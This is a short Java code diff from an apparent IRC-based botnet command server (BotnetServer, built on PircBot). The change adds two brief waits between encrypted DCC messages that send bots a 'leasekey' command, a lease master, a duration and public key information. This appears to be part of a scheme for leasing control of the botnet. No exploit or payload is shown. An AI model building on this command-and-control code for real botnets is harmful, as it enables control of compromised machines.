@@ -253,7 +253,9 @@ public class BotnetServer extends PircBot {
 					//System.out.println(command + "\n\n" + botKeys.get(name).encryptMsg(command));
 					DccChat botChat = this.dccSendChatRequest(name, TIMEOUT);
 					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey", getNonce(name)));
+					wait(100);
 					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster, getNonce(name)));
+					wait(100);
 					botChat.sendLine(botKeys.get(name).encryptMsg(duration + "", getNonce(name)));
 					System.out.println("pub info in server: " + leasedPubInfo);
 					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo, getNonce(name)));
